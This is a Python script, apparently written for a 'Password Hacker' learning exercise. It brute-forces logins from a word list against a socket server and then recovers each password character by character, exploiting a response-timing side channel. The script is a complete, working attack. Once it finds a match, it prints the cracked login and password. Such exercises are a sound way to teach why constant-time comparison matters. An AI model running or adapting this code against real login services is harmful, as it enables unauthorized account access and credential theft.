import sys
import socket
import json
import string
import time

# List of all possible characters that can be used in the password
CHARSET = string.ascii_letters + string.digits

# Load the list of login candidates from the file
with open("C:\\Users\\wasud\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r") as file:
    logins = [line.strip() for line in file]

# Function to send a JSON request to the server and receive the response
def send_request(sock, data):
    request = json.dumps(data).encode()
    sock.send(request)
    response = json.loads(sock.recv(1024).decode())
    return response

# Create a socket and connect to the server


def hack():
    args = sys.argv
    host = args[1]
    port = int(args[2])
    address = (host, port)
    with socket.socket() as sock:
        sock.connect(address)
        for login in logins:
            # Try an empty password for each login candidate
            password = " "
            data = {"login": login, "password": password}
            response = send_request(sock, data)
            if response["result"] == "Wrong password!":
                # Try out every possible password of length 1
                for char in CHARSET:
                    password = char
                    data = {"login": login, "password": password}
                    start_time = time.monotonic()
                    response = send_request(sock, data)
                    end_time = time.monotonic()
                    if end_time - start_time > 0.1 and response["result"] == "Wrong password!":
                        # The response took longer than 0.1 seconds, so the password starts with this character
                        break
                # Try to find the rest of the password
                while True:
                    for char in CHARSET:
                        password_try = password + char
                        data = {"login": login, "password": password_try}
                        start_time = time.monotonic()
                        response = send_request(sock, data)
                        end_time = time.monotonic()
                        if end_time - start_time > 0.1 and response["result"] == "Wrong password!":
                            # The response took longer than 0.1 seconds, so the password continues with this character
                            password = password_try
                            break
                        elif response["result"] == "Connection success!":
                            # We have found the correct password, so print the result and exit the program
                            result = {"login": login, "password": password_try}
                            print(json.dumps(result))
                            sys.exit()


if __name__ == "__main__":
    hack()
    